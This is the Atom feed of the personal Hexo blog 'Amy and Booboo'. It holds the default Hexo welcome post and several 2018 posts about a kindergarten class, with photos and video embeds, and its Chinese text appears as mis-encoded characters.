<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Amy and Booboo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.toberoot.com/"/>
  <updated>2020-03-22T14:23:51.136Z</updated>
  <id>http://www.toberoot.com/</id>
  
  <author>
    <name>BoobooWei</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Hello World</title>
    <link href="http://www.toberoot.com/2020/03/22/booboo_others/hello-world/"/>
    <id>http://www.toberoot.com/2020/03/22/booboo_others/hello-world/</id>
    <published>2020-03-22T14:23:51.136Z</published>
    <updated>2020-03-22T14:23:51.136Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
      
    
    </summary>
    
    
      <category term="æŠ€æœ¯å¹¿è§’" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%B9%BF%E8%A7%92/"/>
    
      <category term="Hexo" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%B9%BF%E8%A7%92/Hexo/"/>
    
    
      <category term="hexo" scheme="http://www.toberoot.com/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>å›½åº†å‰å­¦æ´—æ‰‹</title>
    <link href="http://www.toberoot.com/2018/09/30/amy_life/%E5%9B%BD%E5%BA%86%E5%89%8D%E5%AD%A6%E6%B4%97%E6%89%8B/"/>
    <id>http://www.toberoot.com/2018/09/30/amy_life/%E5%9B%BD%E5%BA%86%E5%89%8D%E5%AD%A6%E6%B4%97%E6%89%8B/</id>
    <published>2018-09-30T10:43:53.000Z</published>
    <updated>2020-03-22T08:31:38.472Z</updated>
    
    <content type="html"><![CDATA[<p>ä»Šå¤©äººå°‘ï¼Œæˆ‘ä»¬åå°æœˆäº®ï¼Œç„¶åç»™ä»–ä»¬æ¯äººç”¨äº†å…æ´—æ´—æ‰‹æ¶²ï¼Œæ´—å°æ‰‹ï¼Œå›½åº†èŠ‚å‡ºå»ä¸è¦å¿˜è®°å¸¦å“¦</p><a id="more"></a><p align="center"><embed src='http://player.youku.com/player.php/sid/XMzg0Mzk0NDI5Ng==/v.swf' allowFullScreen='true' quality='high' width='480' height='400' align='middle' allowScriptAccess='always' type='application/x-shockwave-flash'></embed></p><p><img src="%E5%9B%BD%E5%BA%86%E5%89%8D%E5%AD%A6%E6%B4%97%E6%89%8B/01.jpg" alt=""></p><p>å›å›è€å¸ˆ:<br>ä»–ä»¬è®©æˆ‘å‘ç»™ä½ ä»¬ğŸ˜‚</p><p>å°æ…ˆçš„æ™šæ‰˜ç­åˆ¶ä½œäº”æ˜Ÿçº¢æ——</p><p align="center"><embed src='http://player.youku.com/player.php/sid/XMzg0Mzk0OTg4MA==/v.swf' allowFullScreen='true' quality='high' width='480' height='400' align='middle' allowScriptAccess='always' type='application/x-shockwave-flash'></embed></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ä»Šå¤©äººå°‘ï¼Œæˆ‘ä»¬åå°æœˆäº®ï¼Œç„¶åç»™ä»–ä»¬æ¯äººç”¨äº†å…æ´—æ´—æ‰‹æ¶²ï¼Œæ´—å°æ‰‹ï¼Œå›½åº†èŠ‚å‡ºå»ä¸è¦å¿˜è®°å¸¦å“¦&lt;/p&gt;
    
    </summary>
    
    
      <category term="å¾€æ˜”è¿½å¿†" scheme="http://www.toberoot.com/categories/%E5%BE%80%E6%98%94%E8%BF%BD%E5%BF%86/"/>
    
      <category term="å°äºŒç­" scheme="http://www.toberoot.com/categories/%E5%BE%80%E6%98%94%E8%BF%BD%E5%BF%86/%E5%B0%8F%E4%BA%8C%E7%8F%AD/"/>
    
    
      <category term="å®å®æˆé•¿" scheme="http://www.toberoot.com/tags/%E5%AE%9D%E5%AE%9D%E6%88%90%E9%95%BF/"/>
    
  </entry>
  
  <entry>
    <title>å®å®ä»¬ä¸Šç­å•¦</title>
    <link href="http://www.toberoot.com/2018/09/29/amy_life/%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/"/>
    <id>http://www.toberoot.com/2018/09/29/amy_life/%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/</id>
    <published>2018-09-29T10:43:41.000Z</published>
    <updated>2020-03-22T08:31:38.457Z</updated>
    
    <content type="html"><![CDATA[<p>å›å›è€å¸ˆ:<br>æœ€è¿‘æˆ‘ä»¬å­©å­çš„è§’è‰²æ¸¸æˆæ…¢æ…¢è¿›å…¥çŠ¶æ€äº†ï¼Œä½†ä¹Ÿæœ‰å‡ ä¸ªå­©å­æ²‰è¿·äºç§¯æœ¨æ¸¸æˆæ— æ³•è‡ªæ‹”ï¼Œæˆ‘ä»¬å¸Œæœ›å®¶é•¿ä»¬åœ¨å®¶é‡Œä¹Ÿå¯ä»¥å’Œå­©å­ä»¬ä¸€èµ·ç©è§’è‰²æ‰®æ¼”æ¸¸æˆï¼Œå’Œå­©å­å¤šäº’åŠ¨ï¼Œä¹Ÿå¯ä»¥æ‹“å®½æ€è·¯ï¼Œå¯ä»¥åšç°å®ç”Ÿæ´»ä¸­ä¸èƒ½åšçš„ï¼Œæ¯”å¦‚ä»™å¥³å•Šï¼Œå…¬ä¸»å•Šï¼Œå°å£«å…µç­‰ç­‰</p><a id="more"></a><p><img src="%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/01.jpg" alt=""></p><p><img src="%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/02.jpg" alt="02"></p><p><img src="%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/03.jpg" alt="03"></p><p><img src="%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/04.jpg" alt="04"></p><p><img src="%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/05.jpg" alt="05"></p><p><img src="%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/06.jpg" alt="06"></p><p><img src="%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/07.jpg" alt="07"></p><p><img src="%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/08.jpg" alt="08"></p><p><img src="%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/09.jpg" alt="09"></p><p><img src="%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/10.jpg" alt="10"></p><p><img src="%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/11.jpg" alt="11"></p><p><img src="%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/12.jpg" alt="12"></p><p><img src="%E5%AE%9D%E5%AE%9D%E4%BB%AC%E4%B8%8A%E7%8F%AD%E5%95%A6/13.jpg" alt="13"></p><p>å›å›è€å¸ˆ:<br>ä»Šå¤©æˆ‘ä»¬è¿˜è®¤è¯†äº†äº”æ˜Ÿçº¢æ——ï¼ŒçŸ¥é“è‡ªå·±æ˜¯ä¸€ä¸ªä¸­å›½äººï¼Œæˆ‘å‘Šè¯‰ä»–ä»¬è¿‡å‡ å¤©è¦ç»™ç¥–å›½å¦ˆå¦ˆè¿‡ç”Ÿæ—¥äº†ï¼Œè¦ä¼‘æ¯ä¸ƒå¤©ï¼Œæœ‰å­©å­è¿˜åé©³è¯´ä¸è¡Œï¼Œä¼‘æ¯ä¸‰å¤©å°±å¤Ÿäº†ï¼Œå“ˆå“ˆæˆ‘è¿˜å‘Šè¯‰ä»–ä»¬ç¥–å›½å¦ˆå¦ˆä¼šè¯·ä»–ä»¬åƒç”Ÿæ—¥è›‹ç³•çš„</p><p>åˆé¤å‰è¿˜é¢å¤–å­¦äº†ä¸€é¦–æ­Œï¼Œé€ç»™æˆ‘ä»¬çš„ç¥–å›½å¦ˆå¦ˆ</p><p><a href="https://music.163.com/#/song?id=498555737&market=baiduqk" target="_blank" rel="noopener">å„¿æ­Œ-ç¥–å›½ç¥–å›½æˆ‘çˆ±ä½ </a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å›å›è€å¸ˆ:&lt;br&gt;æœ€è¿‘æˆ‘ä»¬å­©å­çš„è§’è‰²æ¸¸æˆæ…¢æ…¢è¿›å…¥çŠ¶æ€äº†ï¼Œä½†ä¹Ÿæœ‰å‡ ä¸ªå­©å­æ²‰è¿·äºç§¯æœ¨æ¸¸æˆæ— æ³•è‡ªæ‹”ï¼Œæˆ‘ä»¬å¸Œæœ›å®¶é•¿ä»¬åœ¨å®¶é‡Œä¹Ÿå¯ä»¥å’Œå­©å­ä»¬ä¸€èµ·ç©è§’è‰²æ‰®æ¼”æ¸¸æˆï¼Œå’Œå­©å­å¤šäº’åŠ¨ï¼Œä¹Ÿå¯ä»¥æ‹“å®½æ€è·¯ï¼Œå¯ä»¥åšç°å®ç”Ÿæ´»ä¸­ä¸èƒ½åšçš„ï¼Œæ¯”å¦‚ä»™å¥³å•Šï¼Œå…¬ä¸»å•Šï¼Œå°å£«å…µç­‰ç­‰&lt;/p&gt;
    
    </summary>
    
    
      <category term="å¾€æ˜”è¿½å¿†" scheme="http://www.toberoot.com/categories/%E5%BE%80%E6%98%94%E8%BF%BD%E5%BF%86/"/>
    
      <category term="å°äºŒç­" scheme="http://www.toberoot.com/categories/%E5%BE%80%E6%98%94%E8%BF%BD%E5%BF%86/%E5%B0%8F%E4%BA%8C%E7%8F%AD/"/>
    
    
      <category term="å®å®æˆé•¿" scheme="http://www.toberoot.com/tags/%E5%AE%9D%E5%AE%9D%E6%88%90%E9%95%BF/"/>
    
  </entry>
  
  <entry>
    <title>æœˆé¥¼çƒ˜åŸ¹å’Œå°å°æ¬è¿å·¥</title>
    <link href="http://www.toberoot.com/2018/09/21/amy_life/%E6%9C%88%E9%A5%BC%E7%83%98%E5%9F%B9%E5%92%8C%E5%B0%8F%E5%B0%8F%E6%90%AC%E8%BF%90%E5%B7%A5/"/>
    <id>http://www.toberoot.com/2018/09/21/amy_life/%E6%9C%88%E9%A5%BC%E7%83%98%E5%9F%B9%E5%92%8C%E5%B0%8F%E5%B0%8F%E6%90%AC%E8%BF%90%E5%B7%A5/</id>
    <published>2018-09-21T12:25:51.000Z</published>
    <updated>2020-03-22T08:31:38.460Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸­ç§‹èŠ‚å¿«åˆ°äº†ï¼Œè€å¸ˆå¸¦å®å®ä»¬ä¸€èµ·åšäº†æœˆé¥¼ï¼Œæ‹¿å»çƒ¤äº†ï¼Œå®å®ä»¬è¿˜å¸®è€å¸ˆä¸€èµ·æ¬æ¡Œå­ï¼Œè™½ç„¶ç»“å±€å·®å¼ºäººæ„ï¼Œä½†æ˜¯å­©å­ä»¬éƒ½å¾ˆå¼€å¿ƒå‘¢ï¼</p><a id="more"></a><p align="center"><embed src='http://player.youku.com/player.php/sid/XMzg0Mzk0NDg5Ng==/v.swf' allowFullScreen='true' quality='high' width='480' height='400' align='middle' allowScriptAccess='always' type='application/x-shockwave-flash'></embed></p><p><img src="%E6%9C%88%E9%A5%BC%E7%83%98%E5%9F%B9%E5%92%8C%E5%B0%8F%E5%B0%8F%E6%90%AC%E8%BF%90%E5%B7%A5/01.jpg" alt=""></p><p><img src="%E6%9C%88%E9%A5%BC%E7%83%98%E5%9F%B9%E5%92%8C%E5%B0%8F%E5%B0%8F%E6%90%AC%E8%BF%90%E5%B7%A5/02.jpg" alt="02"></p><p><img src="%E6%9C%88%E9%A5%BC%E7%83%98%E5%9F%B9%E5%92%8C%E5%B0%8F%E5%B0%8F%E6%90%AC%E8%BF%90%E5%B7%A5/03.jpg" alt="03"></p><p><img src="%E6%9C%88%E9%A5%BC%E7%83%98%E5%9F%B9%E5%92%8C%E5%B0%8F%E5%B0%8F%E6%90%AC%E8%BF%90%E5%B7%A5/04.jpg" alt="04"></p><p><img src="%E6%9C%88%E9%A5%BC%E7%83%98%E5%9F%B9%E5%92%8C%E5%B0%8F%E5%B0%8F%E6%90%AC%E8%BF%90%E5%B7%A5/05.jpg" alt="05"></p><p><img src="%E6%9C%88%E9%A5%BC%E7%83%98%E5%9F%B9%E5%92%8C%E5%B0%8F%E5%B0%8F%E6%90%AC%E8%BF%90%E5%B7%A5/06.jpg" alt="06"></p><p><img src="%E6%9C%88%E9%A5%BC%E7%83%98%E5%9F%B9%E5%92%8C%E5%B0%8F%E5%B0%8F%E6%90%AC%E8%BF%90%E5%B7%A5/07.jpg" alt="07"></p><p><img src="%E6%9C%88%E9%A5%BC%E7%83%98%E5%9F%B9%E5%92%8C%E5%B0%8F%E5%B0%8F%E6%90%AC%E8%BF%90%E5%B7%A5/08.jpg" alt="08"></p><p><img src="%E6%9C%88%E9%A5%BC%E7%83%98%E5%9F%B9%E5%92%8C%E5%B0%8F%E5%B0%8F%E6%90%AC%E8%BF%90%E5%B7%A5/09.jpg" alt="09"></p><p><img src="%E6%9C%88%E9%A5%BC%E7%83%98%E5%9F%B9%E5%92%8C%E5%B0%8F%E5%B0%8F%E6%90%AC%E8%BF%90%E5%B7%A5/20.jpg" alt="20"></p><p><img src="%E6%9C%88%E9%A5%BC%E7%83%98%E5%9F%B9%E5%92%8C%E5%B0%8F%E5%B0%8F%E6%90%AC%E8%BF%90%E5%B7%A5/00.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ä¸­ç§‹èŠ‚å¿«åˆ°äº†ï¼Œè€å¸ˆå¸¦å®å®ä»¬ä¸€èµ·åšäº†æœˆé¥¼ï¼Œæ‹¿å»çƒ¤äº†ï¼Œå®å®ä»¬è¿˜å¸®è€å¸ˆä¸€èµ·æ¬æ¡Œå­ï¼Œè™½ç„¶ç»“å±€å·®å¼ºäººæ„ï¼Œä½†æ˜¯å­©å­ä»¬éƒ½å¾ˆå¼€å¿ƒå‘¢ï¼&lt;/p&gt;
    
    </summary>
    
    
      <category term="å¾€æ˜”è¿½å¿†" scheme="http://www.toberoot.com/categories/%E5%BE%80%E6%98%94%E8%BF%BD%E5%BF%86/"/>
    
      <category term="å°äºŒç­" scheme="http://www.toberoot.com/categories/%E5%BE%80%E6%98%94%E8%BF%BD%E5%BF%86/%E5%B0%8F%E4%BA%8C%E7%8F%AD/"/>
    
    
      <category term="å®å®æˆé•¿" scheme="http://www.toberoot.com/tags/%E5%AE%9D%E5%AE%9D%E6%88%90%E9%95%BF/"/>
    
  </entry>
  
  <entry>
    <title>å®å®ä»¬å¼€å§‹æ¼±å£äº†</title>
    <link href="http://www.toberoot.com/2018/09/20/amy_life/%E5%AE%9D%E5%AE%9D%E4%BB%AC%E5%BC%80%E5%A7%8B%E6%BC%B1%E5%8F%A3%E4%BA%86/"/>
    <id>http://www.toberoot.com/2018/09/20/amy_life/%E5%AE%9D%E5%AE%9D%E4%BB%AC%E5%BC%80%E5%A7%8B%E6%BC%B1%E5%8F%A3%E4%BA%86/</id>
    <published>2018-09-20T12:08:51.000Z</published>
    <updated>2020-03-22T08:31:38.469Z</updated>
    
    <content type="html"><![CDATA[<p>æ‘˜è¦ï¼šä»Šå¤©å¼€å§‹æˆ‘ä»¬è®©å®å®ä»¬å¼€å§‹æ¼±å£äº†ï¼Œæ‰€ä»¥å›å®¶ä¹Ÿè¦ç»§ç»­ä¿æŒè¿™ä¸ªå¥½ä¹ æƒ¯å“¦ï½</p><a id="more"></a><p>å›å›è€å¸ˆè¯­å½•</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">å„ä½äº²ä»¬ï¼Œé€šè¿‡æ˜¨å¤©çš„å®¶é•¿ä¼šï¼Œæˆ‘ä»¬çœ‹åˆ°äº†å®¶é•¿å›å»çš„åŠªåŠ›ï¼Œä»Šå¤©åˆé¥­æ˜æ˜¾è¿›æ­¥çš„å®å®æœ‰ï¼š@å¼ ç‘¾å®‰å¦ˆå¦ˆâ€…@æ“æ¢“æ¡å¦ˆå¦ˆâ€…@ä½†é¢å®¸å¦ˆå¦ˆâ€…@ä½•æ™Ÿç¿å¦ˆå¦ˆâ€…@å¼ æ¬è§…å¦ˆå¦ˆâ€…@ä¸¥é­æ…ˆå¦ˆå¦ˆâ€…@ç‹æ™Ÿå®å¦ˆå¦ˆâ€…ï¼Œå…¶ä»–å®å®ä»¬ç»§ç»­åŠ æ²¹å“¦ï½</span><br><span class="line"></span><br><span class="line">åƒé¥­æˆ‘ä»¬æ˜¯å’Œå­©å­ä»¬è¯´ï¼šå°æ±½è½¦è£…è£…æ»¡ï¼Œè½¬å¼¯é€åˆ°å±±æ´é‡Œï¼Œæ»‘æ»‘æ¢¯æ»‘åˆ°è‚šå­é‡Œï¼Œå› ä¸ºå¾ˆå¤šå®å®å‹ºå­ä¸å¯¹ç€å˜´å·´ï¼Œæ‰€ä»¥é¥­å®å®æ‰åœ¨æ¡Œå­ä¸Šéƒ½å“­äº†ã€‚</span><br><span class="line"></span><br><span class="line">å¦å¤–ï¼Œä»Šå¤©æˆ‘ä»¬ç»ƒä¹ äº†å®å®ä»¬æ’é˜Ÿèµ°æ¥¼æ¢¯ï¼Œå¤§å¤šæ•°å·²ç»åƒæ¨¡åƒæ ·çš„äº†ï¼Œä¸Šä¸‹æ¥¼æ¢¯é å³èµ°äº†ï¼Œä»Šå¤©çš„è¿åŠ¨é‡æœ‰ç‚¹å¤§ï¼Œæ‰€ä»¥ä¼°è®¡å®è´ä»¬ä»Šæ™šåˆè¦æ—©æ—©ç¡è§‰äº†.</span><br></pre></td></tr></table></figure><p>ä»Šå¤©å¼€å§‹æˆ‘ä»¬è®©å®å®ä»¬å¼€å§‹æ¼±å£äº†ï¼Œæ‰€ä»¥å›å®¶ä¹Ÿè¦ç»§ç»­ä¿æŒè¿™ä¸ªå¥½ä¹ æƒ¯å“¦ï½</p><p><img src="%E5%AE%9D%E5%AE%9D%E4%BB%AC%E5%BC%80%E5%A7%8B%E6%BC%B1%E5%8F%A3%E4%BA%86/01.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æ‘˜è¦ï¼šä»Šå¤©å¼€å§‹æˆ‘ä»¬è®©å®å®ä»¬å¼€å§‹æ¼±å£äº†ï¼Œæ‰€ä»¥å›å®¶ä¹Ÿè¦ç»§ç»­ä¿æŒè¿™ä¸ªå¥½ä¹ æƒ¯å“¦ï½&lt;/p&gt;
    
    </summary>
    
    
      <category term="å¾€æ˜”è¿½å¿†" scheme="http://www.toberoot.com/categories/%E5%BE%80%E6%98%94%E8%BF%BD%E5%BF%86/"/>
    
      <category term="å°äºŒç­" scheme="http://www.toberoot.com/categories/%E5%BE%80%E6%98%94%E8%BF%BD%E5%BF%86/%E5%B0%8F%E4%BA%8C%E7%8F%AD/"/>
    
    
      <category term="å®å®æˆé•¿" scheme="http://www.toberoot.com/tags/%E5%AE%9D%E5%AE%9D%E6%88%90%E9%95%BF/"/>
    
  </entry>
  
  <entry>
    <title>å®¶é•¿ä¼š</title>
    <link href="http://www.toberoot.com/2018/09/19/amy_life/%E5%AE%B6%E9%95%BF%E4%BC%9A/"/>
    <id>http://www.toberoot.com/2018/09/19/amy_life/%E5%AE%B6%E9%95%BF%E4%BC%9A/</id>
    <published>2018-09-19T11:40:55.000Z</published>
    <updated>2020-03-22T08:31:38.466Z</updated>
    
    <content type="html"><![CDATA[<p>æ‘˜è¦ï¼šå¹¼å„¿å›­å¼€å­¦ç¬¬10å¤©ï¼Œå®å®ä»¬é€æ¸ç¨³å®šï¼Œèå…¥è¿™ä¸ªå¤§å®¶åº­ï¼Œä»Šå¤©è€å¸ˆå’Œæˆ‘ä»¬åˆ†äº«å®å®ä»¬çš„å¹¼å„¿å›­æ—¥å¸¸ç”Ÿæ´»ï¼Œä»¥åŠæˆ‘ä»¬å¯¹æˆ‘ä»¬å®¶é•¿çš„ä¸€äº›å»ºè®®ï¼Œéå¸¸åœ°ç”¨å¿ƒã€‚</p><a id="more"></a><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/001.jpg" alt=""></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/002.jpg" alt="002"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/003.jpg" alt="003"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/004.jpg" alt="004"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/005.jpg" alt="005"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/006.jpg" alt="006"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/007.jpg" alt="007"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/008.jpg" alt="008"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/010.jpg" alt="010"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/011.jpg" alt="011"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/012.jpg" alt="012"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/013.jpg" alt="013"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/014.jpg" alt="014"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/015.jpg" alt="015"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/016.jpg" alt="016"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/017.jpg" alt="017"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/018.jpg" alt="018"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/019.jpg" alt="019"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/020.jpg" alt="020"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/021.jpg" alt="021"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/022.jpg" alt="022"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/023.jpg" alt="023"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/024.jpg" alt="024"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/025.jpg" alt="025"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/026.jpg" alt="026"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/027.jpg" alt="027"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/028.jpg" alt="028"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/029.jpg" alt="029"></p><p><img src="%E5%AE%B6%E9%95%BF%E4%BC%9A/030.jpg" alt="030"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æ‘˜è¦ï¼šå¹¼å„¿å›­å¼€å­¦ç¬¬10å¤©ï¼Œå®å®ä»¬é€æ¸ç¨³å®šï¼Œèå…¥è¿™ä¸ªå¤§å®¶åº­ï¼Œä»Šå¤©è€å¸ˆå’Œæˆ‘ä»¬åˆ†äº«å®å®ä»¬çš„å¹¼å„¿å›­æ—¥å¸¸ç”Ÿæ´»ï¼Œä»¥åŠæˆ‘ä»¬å¯¹æˆ‘ä»¬å®¶é•¿çš„ä¸€äº›å»ºè®®ï¼Œéå¸¸åœ°ç”¨å¿ƒã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="å¾€æ˜”è¿½å¿†" scheme="http://www.toberoot.com/categories/%E5%BE%80%E6%98%94%E8%BF%BD%E5%BF%86/"/>
    
      <category term="å°äºŒç­" scheme="http://www.toberoot.com/categories/%E5%BE%80%E6%98%94%E8%BF%BD%E5%BF%86/%E5%B0%8F%E4%BA%8C%E7%8F%AD/"/>
    
    
      <category term="å®å®æˆé•¿" scheme="http://www.toberoot.com/tags/%E5%AE%9D%E5%AE%9D%E6%88%90%E9%95%BF/"/>
    
  </entry>
  
  <entry>
    <title>å‘æœˆäº®è¯´æ™šå®‰</title>
    <link href="http://www.toberoot.com/2018/09/10/amy_life/%E5%90%91%E6%9C%88%E4%BA%AE%E8%AF%B4%E6%99%9A%E5%AE%89/"/>
    <id>http://www.toberoot.com/2018/09/10/amy_life/%E5%90%91%E6%9C%88%E4%BA%AE%E8%AF%B4%E6%99%9A%E5%AE%89/</id>
    <published>2018-09-10T11:26:39.000Z</published>
    <updated>2020-03-22T08:31:38.463Z</updated>
    
    <content type="html"><![CDATA[<p>æ‘˜è¦ï¼šä»Šå¤©ä¸­åˆè®²äº†ä¸€ä¸ªå…³äºã€Œæ™šå®‰ï¼Œæœˆäº®ã€çš„ç¡å‰æ•…äº‹ï¼Œæœ€åçŒ«å¤´é¹°å¯¹æœˆäº®è¯´äº†æ™šå®‰ï¼Œå¤§å®¶ä»Šå¤©ç¡å‰è¿˜å¯ä»¥å’Œå®å®è¯´å“¦ï¼Œå†åŠ ä¸€äº›å…¶ä»–çš„åŠ¨ç‰©å®å®</p><a id="more"></a><p><img src="%E5%90%91%E6%9C%88%E4%BA%AE%E8%AF%B4%E6%99%9A%E5%AE%89/01.jpg" alt=""></p><p><img src="%E5%90%91%E6%9C%88%E4%BA%AE%E8%AF%B4%E6%99%9A%E5%AE%89/02.jpg" alt="02"></p><p><img src="%E5%90%91%E6%9C%88%E4%BA%AE%E8%AF%B4%E6%99%9A%E5%AE%89/03.jpg" alt="03"></p><p><img src="%E5%90%91%E6%9C%88%E4%BA%AE%E8%AF%B4%E6%99%9A%E5%AE%89/04.jpg" alt="04"></p><p><img src="%E5%90%91%E6%9C%88%E4%BA%AE%E8%AF%B4%E6%99%9A%E5%AE%89/05.jpg" alt="05"></p><p><img src="%E5%90%91%E6%9C%88%E4%BA%AE%E8%AF%B4%E6%99%9A%E5%AE%89/06.jpg" alt="06"></p><p><img src="%E5%90%91%E6%9C%88%E4%BA%AE%E8%AF%B4%E6%99%9A%E5%AE%89/07.jpg" alt="07"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æ‘˜è¦ï¼šä»Šå¤©ä¸­åˆè®²äº†ä¸€ä¸ªå…³äºã€Œæ™šå®‰ï¼Œæœˆäº®ã€çš„ç¡å‰æ•…äº‹ï¼Œæœ€åçŒ«å¤´é¹°å¯¹æœˆäº®è¯´äº†æ™šå®‰ï¼Œå¤§å®¶ä»Šå¤©ç¡å‰è¿˜å¯ä»¥å’Œå®å®è¯´å“¦ï¼Œå†åŠ ä¸€äº›å…¶ä»–çš„åŠ¨ç‰©å®å®&lt;/p&gt;
    
    </summary>
    
    
      <category term="å¾€æ˜”è¿½å¿†" scheme="http://www.toberoot.com/categories/%E5%BE%80%E6%98%94%E8%BF%BD%E5%BF%86/"/>
    
      <category term="å°äºŒç­" scheme="http://www.toberoot.com/categories/%E5%BE%80%E6%98%94%E8%BF%BD%E5%BF%86/%E5%B0%8F%E4%BA%8C%E7%8F%AD/"/>
    
    
      <category term="å®å®æˆé•¿" scheme="http://www.toberoot.com/tags/%E5%AE%9D%E5%AE%9D%E6%88%90%E9%95%BF/"/>
    
  </entry>
  
  <entry>
